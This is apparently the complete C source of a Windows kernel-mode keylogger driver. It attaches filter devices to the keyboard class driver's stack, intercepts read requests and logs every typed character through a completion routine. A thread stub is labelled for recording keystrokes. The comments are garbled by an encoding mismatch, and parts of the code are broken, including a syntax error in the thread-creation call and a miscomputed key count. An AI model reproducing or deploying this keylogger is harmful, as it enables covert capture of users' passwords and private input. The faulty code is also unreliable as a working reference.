#include "KeyLoger.h"
#include <ntddk.h>
#include <ntddkbd.h>

//ɨ������������Ķ�Ӧ�� 
unsigned char asciiTbl[] = {
	0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09, //normal  
	0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x5B, 0x5D, 0x0D, 0x00, 0x61, 0x73,
	0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x7A, 0x78, 0x63, 0x76,
	0x62, 0x6E, 0x6D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E,
	0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09, //caps  
	0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x5B, 0x5D, 0x0D, 0x00, 0x41, 0x53,
	0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x5A, 0x58, 0x43, 0x56,
	0x42, 0x4E, 0x4D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E,
	0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09, //shift  
	0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x7B, 0x7D, 0x0D, 0x00, 0x41, 0x53,
	0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x5A, 0x58, 0x43, 0x56,
	0x42, 0x4E, 0x4D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E,
	0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09, //caps + shift  
	0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x7B, 0x7D, 0x0D, 0x00, 0x61, 0x73,
	0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x7A, 0x78, 0x63, 0x76,
	0x62, 0x6E, 0x6D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
	0x32, 0x33, 0x30, 0x2E
};

int g_KeyIrpCount = 0;

// flags for keyboard status  
#define S_SHIFT             1  
#define S_CAPS              2  
#define S_NUM               4  
static int kb_status = S_NUM;
char __stdcall GetKeyStroke(UCHAR sch)
{
	UCHAR   ch = 0;
	int     off = 0;

	if ((sch & 0x80) == 0)  //make  
	{
		if ((sch < 0x47) ||
			((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock  
		{
			ch = asciiTbl[off + sch];
		}

		switch (sch)
		{
		case 0x3A:
			kb_status ^= S_CAPS;
			break;

		case 0x2A:
		case 0x36:
			kb_status |= S_SHIFT;
			break;

		case 0x45:
			kb_status ^= S_NUM;
		}
	}
	else        //break  
	{
		if (sch == 0xAA || sch == 0xB6)
			kb_status &= ~S_SHIFT;
	}

	return ch;
}


//  ж�������и��ӣ������ܻ���һ��IRP������û�з��أ�
//���ֱ��ж�����������������������֮�󣬻�ȥ����������̣�����ʵ������������Ѿ������ں˿ռ���
//�����ڻص����������һ���Ѿ�ж���˵�dll�е�ĳ����������0�����棬��ͻ����������
//
//����취����
void DriverUnload(PDRIVER_OBJECT DriverObject)
{
	DbgPrint(("Keyloger unload enter\n"));
	LARGE_INTEGER DelayTime;
	PDEVICE_OBJECT pDevice = DriverObject->DeviceObject;

	DelayTime = RtlConvertLongToLargeInteger(-(100 * 10000));

	while (pDevice != NULL){
		//Detach Keyloger
	    IoDetachDevice(((PDEVICEEXTENSION)pDevice->DeviceExtension)->pLowerDeviceObject);
		pDevice = pDevice->NextDevice;
	}

	ASSERT(pDevice == NULL);

	while (g_KeyIrpCount)
	{
		KeDelayExecutionThread(KernelMode, FALSE, &DelayTime);
	}

	//ɾ���豸
	IoDeleteDevice(DriverObject->DeviceObject);

	DbgPrint(("Keyloger unload leave\n"));
}

/*
* ���ڲ������ĵ�����IRP_MJ_XX�Ļص�����
*/
NTSTATUS
MyDispatchPass(
	struct _DEVICE_OBJECT  *DeviceObject,
	struct _IRP  *Irp
)
{
	IoSkipCurrentIrpStackLocation(Irp);
	PDEVICEEXTENSION pKeyDeviceExtsion = (PDEVICEEXTENSION)DeviceObject->DeviceExtension;

	return IoCallDriver(pKeyDeviceExtsion->pLowerDeviceObject, Irp);
}

/*
* IRP_MJ_READ���������
* ���ڻ�ȡ���ߴ�ӡ���û��İ���
*/
NTSTATUS
MyKeyLogerReadIoCompletion(
	__in PDEVICE_OBJECT  DeviceObject,
	__in PIRP  Irp,
	__in PVOID  Context
)
{
	//����ֱ���õ�����֮�󣬾ʹ�ӡ������
	int i = 0;
	//�����ж�IRP��״̬�Ƿ���ȷ
	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		//�ֱ��ȡkey���鼰�����С
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)(Irp->AssociatedIrp.SystemBuffer);
		int numKeys = Irp->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA);

		for (i = 0; i < numKeys; i++)
		{
			char ch = GetKeyStroke((UCHAR)keys[i].MakeCode);
			if (ch >= 0x20 && ch < 0x7F){
				if (keys[i].Flags == KEY_MAKE) {
					DbgPrint("���� %c %s", ch, "����");
				}
			}
		}
	}

	//��ʾ�Ѿ������һ��KeyRead Irp
	g_KeyIrpCount--;

	if (Irp->PendingReturned){
		IoMarkIrpPending(Irp);
	}

	return Irp->IoStatus.Status;
}

/*
* ��������RP_MJ_READ��������̡�
* ��Ϊ�������û�֮��IRP�����������������ǻ�û�о����ײ���豸�������ò�������
* �����Ҫ����������̣��Ա㵱�ɹ���ȡ�����ݺ󣬻�����ҵ�������̣��Ӷ���ȡ�����ݡ�
*/
NTSTATUS
MyDispatchRead(
	struct _DEVICE_OBJECT  *DeviceObject,
	struct _IRP  *Irp
)
{
	IoCopyCurrentIrpStackLocationToNext(Irp);

	PDEVICEEXTENSION pKeyDeviceExtsion = (PDEVICEEXTENSION)DeviceObject->DeviceExtension;

	
	//��ʾ��һ��KeyRead Irp����δ���
	g_KeyIrpCount++;

	//����������ɻص�������
	IoSetCompletionRoutine(Irp,
		                   MyKeyLogerReadIoCompletion,
		                   DeviceObject,
							TRUE,
							TRUE,
							TRUE);


	return IoCallDriver(pKeyDeviceExtsion->pLowerDeviceObject, Irp);
}


NTSTATUS
CreateAndBindDevice(PDRIVER_OBJECT DriverObject)
{
	//״̬
	NTSTATUS ntRet = STATUS_SUCCESS;

	//�豸��
	UNICODE_STRING usDeviceName = { 0 };
	UNICODE_STRING usPreDeviceName = { 0 };
	UNICODE_STRING usDriverName = { 0 };

	//�豸����
	PDEVICE_OBJECT pKeylogerDevice = NULL;
	PDEVICE_OBJECT pPreKeyDevice = NULL;
	PDRIVER_OBJECT pKbdDriver = NULL;

	//��ʼ��
	RtlInitUnicodeString(&usDeviceName, L"\\Device\\myKeyloger");
	//����ʹ�ù���devicetree����ȡ�豸��
	RtlInitUnicodeString(&usPreDeviceName, L"\\Device\\KeyboardClass0");
	RtlInitUnicodeString(&usDriverName, L"\\Driver\\kbdclass");

	//��ȡ������������
	ntRet = ObReferenceObjectByName(&usDriverName,
			                OBJ_CASE_INSENSITIVE,
			                NULL,
			                0,
							*IoDriverObjectType,
							KernelMode,
							NULL,
							&pKbdDriver);

	if (!NT_SUCCESS(ntRet)){
		return ntRet;
	}
	else
	{
		//������Ҫ�������ü���һ��
		ObDereferenceObject(pKbdDriver);
	}

	//�������ص�pKbdDriver�е���������
	PDEVICE_OBJECT pTargetDeviceObj = pKbdDriver->DeviceObject;
	while (pTargetDeviceObj != NULL)
	{
		//����һ���µ�FIDO��Ȼ��ʼ��

		//����ע�⣬�´�����device�����ԭ����device�����Ա���һ��
		ntRet = IoCreateDevice(DriverObject,
			sizeof(DEVICEEXTENSION),
			NULL,
			pTargetDeviceObj->DeviceType,
			pTargetDeviceObj->Characteristics,
			FALSE,
			&pKeylogerDevice);

		if (ntRet != STATUS_SUCCESS) {
			goto SAFE_EXIT;
		}

		//������FIDO�����ñ�Ҫ������
		//�������Ĺ������豸��ӵ��豸ջ��
		PDEVICE_OBJECT pLowerDeviceObj = IoAttachDeviceToDeviceStack(pKeylogerDevice,
				                                                        pTargetDeviceObj);
		if (pLowerDeviceObj == NULL) {
			//��ʧ����ɾ��
			IoDeleteDevice(pKeylogerDevice);
			goto SAFE_EXIT;
		}

		RtlZeroMemory(pKeylogerDevice->DeviceExtension, sizeof(DEVICEEXTENSION));
			
		//����֮ǰ��pLowerKeyDevice
		((PDEVICEEXTENSION)pKeylogerDevice->DeviceExtension)->pLowerDeviceObject = pLowerDeviceObj;
		((PDEVICEEXTENSION)pKeylogerDevice->DeviceExtension)->pTargetDeviceObject = pTargetDeviceObj;


		//����flags,���ͨ�ŷ�ʽ�����ü���Ӧ��־λ�����
		pKeylogerDevice->Characteristics = pLowerDeviceObj->Characteristics;
		pKeylogerDevice->StackSize = pLowerDeviceObj->StackSize + 1;
		pKeylogerDevice->DeviceType = pLowerDeviceObj->DeviceType;
		pKeylogerDevice->Flags = pLowerDeviceObj->Flags & (DO_BUFFERED_IO | DO_DIRECT_IO |DO_POWER_PAGABLE);
		pKeylogerDevice->Flags &= ~DO_DEVICE_INITIALIZING;

		//����һ��
		pTargetDeviceObj = pTargetDeviceObj->NextDevice;

	}

SAFE_EXIT:
	//RtlFreeUnicodeString(&usDeviceName);
	//RtlFreeUnicodeString(&usPreDeviceName);

	return ntRet;
}

/*
 * ���������µļ����̹����豸
 */
NTSTATUS
InitKeylogger(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	DriverObject->DriverUnload = DriverUnload;

	//
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION;i++)
	{
		DriverObject->MajorFunction[i] = MyDispatchPass;
	}

	DriverObject->MajorFunction[IRP_MJ_READ] = MyDispatchRead;

	//���������豸
	CreateAndBindDevice(DriverObject);


	return STATUS_SUCCESS;
}

VOID
MyKeyThreadProc(
	__in PVOID StartContext
)
{

	return;
}


/*
 *  �����߳�,���߳����ڼ�¼���水��
 */
NTSTATUS
InitKeyloggerThread(PDRIVER_OBJECT DriverObject)
{
	HANDLE threadHandle;
	//�����߳�
	NTSTATUS ntRet = PsCreateSystemThread(&threadHandle,
		(ACCESS_MASK)0,
		NULL,
		(HANDLE)0,
		NULL,
		(PKSTART_ROUTINE)MyKeyThreadProc, 
		);





	return STATUS_SUCCESS;
}
